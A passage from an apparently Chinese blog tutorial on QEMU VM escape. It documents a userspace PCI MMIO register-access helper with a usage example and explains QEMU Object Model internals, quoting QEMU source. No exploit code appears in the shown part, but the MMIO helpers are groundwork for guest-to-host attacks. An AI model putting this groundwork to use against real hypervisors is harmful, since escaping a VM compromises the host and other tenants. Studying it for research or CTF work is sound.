class="line">    <span class="type">int</span>     fd;                 <span class="comment">// 打开的 /sys/.../resourceN</span></span><br><span class="line">    <span class="type">int</span>     res_idx;            <span class="comment">// 选中的 resource 行号 (BAR 号 0..5)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 物理信息（来自 /sys/.../resource 文本）</span></span><br><span class="line">    <span class="type">uint64_t</span> phys_start;        <span class="comment">// 设备物理起始地址 (BAR 起点, PA)</span></span><br><span class="line">    <span class="type">uint64_t</span> phys_end;          <span class="comment">// 设备物理结束地址 (含端点, PA)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> res_flags; <span class="comment">// resource 行的 flags (仅记录)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span>    inited;</span><br><span class="line">&#125; <span class="type">mmio_ctx_t</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>说明</strong>：<code>g_mmio</code> 为内部全局上下文，API 都在此单实例上操作。</p>
</blockquote>
<hr>
<h2 id="初始化与释放"><a href="#初始化与释放" class="headerlink" title="初始化与释放"></a>初始化与释放</h2><h3 id="int-mmio-init-const-char-bdf-or-path-int-bar-idx"><a href="#int-mmio-init-const-char-bdf-or-path-int-bar-idx" class="headerlink" title="int mmio_init(const char *bdf_or_path, int bar_idx);"></a><code>int mmio_init(const char *bdf_or_path, int bar_idx);</code></h3><ul>
<li><p><strong>功能</strong>：解析设备 <code>resource</code>，选择内存型 BAR，<code>mmap</code> 对应的 <code>/sys/.../resourceN</code>，并填充 <code>g_mmio</code>。</p>
</li>
<li><p><strong>参数</strong>：</p>
<ul>
<li><p><code>bdf_or_path</code>：</p>
<ul>
<li>形如 <code>&quot;0000:02:00.0&quot;</code> 的 <strong>BDF</strong>，或</li>
<li>形如 <code>&quot;/sys/bus/pci/devices/0000:02:00.0/resource&quot;</code> &#x2F; <code>.../resourceN</code> 的 <strong>sysfs 路径</strong>。</li>
</ul>
</li>
<li><p><code>bar_idx</code>：指定 BAR 编号（0..5）。传负数则选择<strong>第一个</strong>内存型 BAR。</p>
</li>
</ul>
</li>
<li><p><strong>返回</strong>：成功 <code>0</code>；失败 <code>-1</code> 并设置 <code>errno</code>。</p>
</li>
<li><p><strong>副作用</strong>：将 <code>g_mmio.inited</code> 置真；记录 <code>phys_start/phys_end/res_flags</code> 等。</p>
</li>
</ul>
<h3 id="void-mmio-fini-void"><a href="#void-mmio-fini-void" class="headerlink" title="void mmio_fini(void);"></a><code>void mmio_fini(void);</code></h3><ul>
<li><strong>功能</strong>：解除映射、关闭 <code>fd</code>，清空 <code>g_mmio</code>。</li>
<li><strong>注意</strong>：调用后，任何读写&#x2F;查询接口都不再有效。</li>
</ul>
<hr>
<h2 id="查询接口"><a href="#查询接口" class="headerlink" title="查询接口"></a>查询接口</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">void</span> *<span class="title function_">mmio_base</span><span class="params">(<span class="type">void</span>)</span>;    <span class="comment">// 返回映射的 VA 基址 (等同 g_mmio.bar)</span></span><br><span class="line"><span class="type">size_t</span>         <span class="title function_">mmio_size</span><span class="params">(<span class="type">void</span>)</span>;    <span class="comment">// 返回设备资源真实大小 (BAR size)</span></span><br><span class="line"><span class="type">int</span>            <span class="title function_">mmio_bar_index</span><span class="params">(<span class="type">void</span>)</span>; <span class="comment">// 返回选择的 BAR 序号 (resource 行号)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_phys_base</span><span class="params">(<span class="type">void</span>)</span>;     <span class="comment">// 返回设备物理起始地址 (BAR 起点, PA)</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_phys_limit</span><span class="params">(<span class="type">void</span>)</span>;    <span class="comment">// 返回设备物理结束地址 (含端点, PA)</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>提示</strong>：<code>mmio_base()</code> 返回的是<strong>进程虚拟地址</strong>；<code>mmio_phys_base()</code> 返回<strong>设备物理地址</strong>。</p>
</blockquote>
<hr>
<h2 id="地址换算"><a href="#地址换算" class="headerlink" title="地址换算"></a>地址换算</h2><h3 id="uint64-t-mmio-offset-to-phys-size-t-off"><a href="#uint64-t-mmio-offset-to-phys-size-t-off" class="headerlink" title="uint64_t mmio_offset_to_phys(size_t off);"></a><code>uint64_t mmio_offset_to_phys(size_t off);</code></h3><ul>
<li><strong>功能</strong>：把<strong>映射内偏移</strong>换算为<strong>设备物理地址</strong>。</li>
<li><strong>公式</strong>：<code>phys = phys_start + off</code></li>
<li><strong>边界</strong>：<code>off &lt; g_mmio.size</code>；否则置 <code>errno=ERANGE</code> 并返回 <code>0</code>。</li>
</ul>
<h3 id="uint64-t-mmio-virt-to-phys-const-void-p"><a href="#uint64-t-mmio-virt-to-phys-const-void-p" class="headerlink" title="uint64_t mmio_virt_to_phys(const void *p);"></a><code>uint64_t mmio_virt_to_phys(const void *p);</code></h3><ul>
<li><strong>功能</strong>：把<strong>映射内某虚拟指针</strong>换算为<strong>设备物理地址</strong>。</li>
<li><strong>公式</strong>：<code>phys = phys_start + ((uintptr_t)p - (uintptr_t)bar)</code></li>
<li><strong>边界</strong>：<code>p</code> 必须位于 <code>[bar, bar + size)</code>；否则置 <code>errno=EINVAL</code> 并返回 <code>0</code>。</li>
</ul>
<blockquote>
<p><strong>注意</strong>：这些 <strong>“物理地址”</strong> 指的是 <strong>CPU 物理地址空间中的 MMIO 区间</strong>（BAR），<strong>不是</strong>设备 DMA 侧地址。若系统启用 IOMMU，设备做 DMA 看到的是<strong>设备地址</strong>，与此不同。</p>
</blockquote>
<hr>
<h2 id="寄存器访问"><a href="#寄存器访问" class="headerlink" title="寄存器访问"></a>寄存器访问</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span>  <span class="title function_">mmio_read8</span> <span class="params">(<span class="type">size_t</span> off)</span>;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">mmio_read16</span><span class="params">(<span class="type">size_t</span> off)</span>;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read32</span><span class="params">(<span class="type">size_t</span> off)</span>;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read64</span><span class="params">(<span class="type">size_t</span> off)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write8</span> <span class="params">(<span class="type">size_t</span> off, <span class="type">uint8_t</span>  v)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write16</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint16_t</span> v)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write32</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint32_t</span> v)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint64_t</span> v)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span> *<span class="title function_">mmio_ptr</span><span class="params">(<span class="type">size_t</span> off)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>入参</strong>：<code>off</code> 是<strong>寄存器偏移</strong>（相对于 BAR 起点），要求 <code>off + width &lt;= size</code>。</p>
</li>
<li><p><strong>返回&#x2F;行为</strong>：</p>
<ul>
<li>读函数在越界时返回 <code>0</code> 并设置 <code>errno=ERANGE</code>。</li>
<li>写函数在越界时<strong>不执行写入</strong>。</li>
<li><code>mmio_ptr(off)</code> 返回 <code>bar + off</code> 的<strong>直接指针</strong>（<code>volatile</code>），越界返回 <code>NULL</code>。</li>
</ul>
</li>
<li><p><strong>端序</strong>：PCI&#x2F;PC 常见为<strong>小端</strong>寄存器布局；上面函数按本机字节序单纯取&#x2F;存（在小端主机上与寄存器端序一致）。如目标为大端或寄存器定义为特定端序，需在调用处处理端序。</p>
</li>
<li><p><strong>对齐</strong>：建议按天然宽度对齐访问（例如 32 位寄存器用 <code>mmio_read32</code>&#x2F;<code>write32</code> 且 <code>off%4==0</code>），避免未对齐访问带来的架构差异。</p>
</li>
</ul>
<hr>
<h2 id="返回值与错误处理"><a href="#返回值与错误处理" class="headerlink" title="返回值与错误处理"></a>返回值与错误处理</h2><ul>
<li><p>成功的查询&#x2F;换算接口返回<strong>有效值</strong>；失败返回 <code>0</code> 或 <code>NULL</code> 并设置 <code>errno</code>：</p>
<ul>
<li><code>EPERM</code>：未 <code>init</code> 或无效上下文；</li>
<li><code>ERANGE</code>：偏移越界；</li>
<li><code>EINVAL</code>：指针不在映射范围内；</li>
<li>另外，<code>mmio_init</code> 可能设置 <code>ENOENT</code>（找不到合适 BAR）、<code>EALREADY</code>、<code>EACCES</code>、<code>EINVAL</code>、<code>ERANGE</code> 等。</li>
</ul>
</li>
<li><p><strong>注意</strong>：对某些平台而言，<strong>物理地址 0</strong> 也可能有效；若要区分“返回 0 是有效还是错误”，请结合 <code>errno</code> 判断。</p>
</li>
</ul>
</blockquote>
<p>使用示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mmio_init(<span class="string">&quot;0000:00:04.0&quot;</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmio_init&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;VA base = %p\n&quot;</span>, mmio_base());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PA base = 0x%016&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, mmio_phys_base());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PA end  = 0x%016&quot;</span> PRIx64 <span class="string">&quot; (size=%zu)\n&quot;</span>,</span><br><span class="line">           mmio_phys_limit(), mmio_size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读写 32 位寄存器</span></span><br><span class="line">    <span class="type">size_t</span> off = <span class="number">0x100</span>;</span><br><span class="line">    <span class="type">uint32_t</span> v = mmio_read32(off);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;READ32[0x%zx] = 0x%08x\n&quot;</span>, off, v);</span><br><span class="line"></span><br><span class="line">    mmio_write32(off, v | <span class="number">0x1</span>); <span class="comment">// 置位 bit0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 偏移与指针 -&gt; 设备物理地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PA(off=0x%zx)  = 0x%016&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">           off, mmio_offset_to_phys(off));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">void</span> *p = mmio_ptr(<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PA(ptr=%p) = 0x%016&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">           (<span class="type">void</span>*)p, mmio_virt_to_phys((<span class="type">void</span>*)p));</span><br><span class="line"></span><br><span class="line">    mmio_fini();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="QEMU-Object-Model"><a href="#QEMU-Object-Model" class="headerlink" title="QEMU Object Model"></a>QEMU Object Model</h2><p>QEMU Object Model（QOM）就是 QEMU 在 <strong>C 语言</strong>里自建的一套“面向对象”系统，用来统一建模和管理模拟中的一切东西（CPU、总线、设备、内存、机器等）。它提供类型系统、继承&#x2F;接口、对象树、属性、以及设备生命周期（realize&#x2F;unrealize）等机制，让设备能被配置、热插拔、迁移，并能被 QMP&#x2F;HMP 进行自省（introspection）。</p>
<ul>
<li><strong>Type</strong>：概念上的“类定义”。在源码里先写一个 <strong><code>TypeInfo</code></strong> 常量描述它；注册后在运行期对应一个 **<code>TypeImpl</code>**（内部表示，放到全局哈希表里）。</li>
<li><strong>Class</strong>：某个类型的<strong>类对象</strong>（保存“虚函数表”等静态行为），类型初始化后得到一个 <strong><code>ObjectClass</code></strong> 实例。</li>
<li><strong>Object</strong>：某个类型的<strong>实例对象</strong>，动态分配的 **<code>Object</code>**（或其派生，比如 <code>DeviceState</code> 内含的 <code>Object</code> 头）。</li>
<li><strong>Property</strong>：对象&#x2F;类对外暴露的<strong>属性访问器</strong>（getter&#x2F;setter 或指向子对象&#x2F;链接），用于命令行与 QMP 自省。</li>
</ul>
<pre class="mermaid">classDiagram
    direction LR

    class TypeInfo {
      +const char* name
      +const char* parent
      +size_t instance_size
      +size_t instance_align
      +void (*instance_init)(Object*)
      +void (*instance_post_init)(Object*)
      +void (*instance_finalize)(Object*)
      +bool abstract
      +size_t class_size
      +void (*class_init)(ObjectClass*, const void*)
      +void (*class_base_init)(ObjectClass*, const void*)
      +const void* class_data
      +InterfaceInfo[] interfaces
    }

    class TypeImpl {
      +const char* name
      +size_t class_size
      +size_t instance_size
      +size_t instance_align
      +void (*class_init)(ObjectClass*, const void*)
      +void (*class_base_init)(ObjectClass*, const void*)
      +const void* class_data
      +void (*instance_init)(Object*)
      +void (*instance_post_init)(Object*)
      +void (*instance_finalize)(Object*)
      +bool abstract
      +const char* parent
      +TypeImpl* parent_type
      +ObjectClass* class  %% 单例 class 对象
      +int num_interfaces
      +InterfaceImpl interfaces[*]
    }

    class ObjectClass {
      +Type type            %% 指回本类的 TypeImpl
      +GSList* interfaces   %% InterfaceClass 列表（按类挂载）
      +const char* object_cast_cache[4]
      +const char* class_cast_cache[4]
      +ObjectUnparent* unparent
      +GHashTable* properties
    }

    class Object {
      +ObjectClass* class   %% 指向所属类
      +ObjectFree* free
      +GHashTable* properties
      +uint32_t ref
      +Object* parent
    }

    class InterfaceInfo {
      +const char* type     %% 接口类型名（注册时声明）
    }

    class InterfaceImpl {
      +const char* typename %% 运行时保存的接口名
    }

    class InterfaceClass {
      <<interface>>
      +ObjectClass parent_class
      +Type interface_type  %% 指向接口自身的 TypeImpl
    }

    %% 关系
    TypeInfo --> TypeImpl : type_register_static()
    TypeImpl --> TypeImpl : parent_type
    TypeImpl *-- ObjectClass : class (singleton)
    Object --> ObjectClass : class
    ObjectClass --> TypeImpl : type
    TypeInfo --> InterfaceInfo : interfaces
    TypeImpl --> InterfaceImpl : interfaces
    InterfaceClass --|> ObjectClass : subclass
    ObjectClass o-- "0..*" InterfaceClass : interfaces (per-class)
    InterfaceClass --> TypeImpl : interface_type</pre>

<p>QOM整个运作包括3个部分，即类型的注册、类型的初始化以及对象的初始化。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/3f36dc33d88574bf3502fea65ae3dd1e.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="类型的注册"><a href="#类型的注册" class="headerlink" title="类型的注册"></a>类型的注册</h3><p><code>TypeInfo</code> 这一结构体用来定义一个「类」的基本属性，该结构体定义于 <code>include/qom/object.h</code> 当中：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;           <span class="comment">// 类型名</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;         <span class="comment">// 父类型名</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;       <span class="comment">// 实例对象大小（派生自 Object；0=沿用父类）</span></span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);        <span class="comment">// 实例初始化（仅初始化本类型成员）</span></span><br><span class="line">    <span class="type">void</span> (*instance_post_init)(Object *obj);   <span class="comment">// 实例收尾（所有 instance_init 之后）</span></span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);    <span class="comment">// 实例析构（先于父类 finalize，仅释放本类型资源）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;              <span class="comment">// 抽象类型？true=不可直接实例化</span></span><br><span class="line">    <span class="type">size_t</span> class_size;          <span class="comment">// 类对象大小（派生自 ObjectClass；0=沿用父类）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);        <span class="comment">// 本类的类初始化：设定/覆盖虚方法、安装属性等</span></span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);   <span class="comment">// 基类修正：父类完成→本类开始前，用于撤销 memcpy 副作用</span></span><br><span class="line">    <span class="type">void</span> *class_data;           <span class="comment">// 传递给 class_init / class_base_init 的数据</span></span><br><span class="line"></span><br><span class="line">    InterfaceInfo *interfaces;  <span class="comment">// 接口列表（以全零元素结尾的静态数组）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>以 <code>hw/misc/edu.c</code> 文件为例，当我们在 Qemu 中要定义一个「类」的时候，我们实际上需要定义一个 <code>TypeInfo</code> 类型的变量。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_edu_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> InterfaceInfo interfaces[] = &#123;</span><br><span class="line">        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> TypeInfo edu_info = &#123;</span><br><span class="line">        .name          = TYPE_PCI_EDU_DEVICE,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(EduState),</span><br><span class="line">        .instance_init = edu_instance_init,</span><br><span class="line">        .class_init    = edu_class_init,</span><br><span class="line">        .interfaces = interfaces,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    type_register_static(&amp;edu_info);</span><br><span class="line">&#125;</span><br><span class="line">type_init(pci_edu_register_types)</span><br></pre></td></tr></table></figure></div>

<p>可以看到各个 QOM 类型最终通过函数 <code>register_module_init</code> 注册到了系统，其中 <code>function</code> 是每个类型都需要实现的初始化函数，<code>type</code> 表示是 <code>MODULE_INIT_QOM</code> 。</p>
<p>这里的 <code>constructor</code> 是编译器属性，编译器会把带有这个属性的函数 <code>do_qemu_init_ ##function</code> 放到特殊的段中，带有这个属性的函数会早于 main 函数执行，也就是说所有的 QOM 类型注册在 main 执行之前就已经执行了。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> module_init(function, type)                                         \</span></span><br><span class="line"><span class="meta">static void __attribute__((constructor)) do_qemu_init_ ## function(void)    \</span></span><br><span class="line"><span class="meta">&#123;                                                                           \</span></span><br><span class="line"><span class="meta">    register_module_init(function, type);                                   \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> type_init(function) module_init(function, MODULE_INIT_QOM)</span></span><br></pre></td></tr></table></figure></div>

<p><code>register_module_init</code> 及相关函数代码如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">register_module_init</span><span class="params">(<span class="type">void</span> (*fn)(<span class="type">void</span>), module_init_type type)</span></span><br><span class="line">&#123;</span><br><span class="line">    ModuleEntry *e;</span><br><span class="line">    ModuleTypeList *l;</span><br><span class="line"></span><br><span class="line">    e = g_malloc0(<span class="keyword">sizeof</span>(*e));</span><br><span class="line">    e-&gt;init = fn;</span><br><span class="line">    e-&gt;type = type;</span><br><span class="line"></span><br><span class="line">    l = find_type(type);</span><br><span class="line"></span><br><span class="line">    QTAILQ_INSERT_TAIL(l, e, node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>register_module_init</code> 函数以类型的初始化函数以及所属类型（对 QOM 类型来说是 <code>MODULE_INIT_QOM</code> ）构建出一个 <code>ModuleEntry</code>，然后插入到对应 module 所属的链表中，所有 module 的链表存放在一个 <code>init_type_list</code> 数组中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/9cc56a8f38b24818c78399aca8de00b6.png"
                      alt="在这里插入图片描述"
                ></p>
<p>进入 main 函数后不久就以 <code>MODULE_INIT_QOM</code> 为参数调用了函数 <code>module_call_init</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">    <span class="title function_">qemu_init</span><span class="params">(argc, argv, envp)</span>;</span><br><span class="line">        module_call_init(MODULE_INIT_QOM);</span><br></pre></td></tr></table></figure></div>

<p>这个函数执行了 <code>init_type_list[MODULE_INIT_QOM]</code> 链表上每一个 <code>ModuleEntry</code> 的 <code>init</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">module_call_init</span><span class="params">(module_init_type type)</span></span><br><span class="line">&#123;</span><br><span class="line">    ModuleTypeList *l;</span><br><span class="line">    ModuleEntry *e;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (modules_init_done[type]) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    l = find_type(type);</span><br><span class="line"></span><br><span class="line">    QTAILQ_FOREACH(e, l, node) &#123;</span><br><span class="line">        e-&gt;init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modules_init_done[type] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>以 edu 设备为例，该类型的 init 函数是 <code>pci_edu_register_types</code>，该函数唯一的工作是构造了一个 <code>TypeInfo</code> 类型的 <code>edu_info</code>，并将其作为参数调用 <code>type_register_static</code>，<code>type_register_static</code> 调用 <code> type_register</code>，最终到达了 <code>type_register_internal</code>，核心工作在这一函数中进行。</p>
<p><code>type_register_internal</code> 函数很简单，<code>type_new</code> 函数首先通过一个 <code>TypeInfo</code> 结构构造出一个 <code>TypeImpl</code>，<code>type_table_add</code> 则将这个 <code>TypeImpl</code> 加入到一个哈希表中。这个哈希表的 key 是 <code>TypeImpl</code> 的名字，value 为 <code>TypeImpl</code> 本身的值。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> TypeImpl *<span class="title function_">type_new</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span></span><br><span class="line">&#123;</span><br><span class="line">    TypeImpl *ti = g_malloc0(<span class="keyword">sizeof</span>(*ti));</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    g_assert(info-&gt;name != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type_table_lookup(info-&gt;name) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Registering `%s&#x27; which already exists\n&quot;</span>, info-&gt;name);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ti-&gt;name = g_strdup(info-&gt;name);</span><br><span class="line">    ti-&gt;parent = g_strdup(info-&gt;parent);</span><br><span class="line"></span><br><span class="line">    ti-&gt;class_size = info-&gt;class_size;</span><br><span class="line">    ti-&gt;instance_size = info-&gt;instance_size;</span><br><span class="line"></span><br><span class="line">    ti-&gt;class_init = info-&gt;class_init;</span><br><span class="line">    ti-&gt;class_base_init = info-&gt;class_base_init;</span><br><span class="line">    ti-&gt;class_data = info-&gt;class_data;</span><br><span class="line"></span><br><span class="line">    ti-&gt;instance_init = info-&gt;instance_init;</span><br><span class="line">    ti-&gt;instance_post_init = info-&gt;instance_post_init;</span><br><span class="line">    ti-&gt;instance_finalize = info-&gt;instance_finalize;</span><br><span class="line"></span><br><span class="line">    ti-&gt;abstract = info-&gt;abstract;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; info-&gt;interfaces &amp;&amp; info-&gt;interfaces[i].type; i++) &#123;</span><br><span class="line">        ti-&gt;interfaces[i].typename = 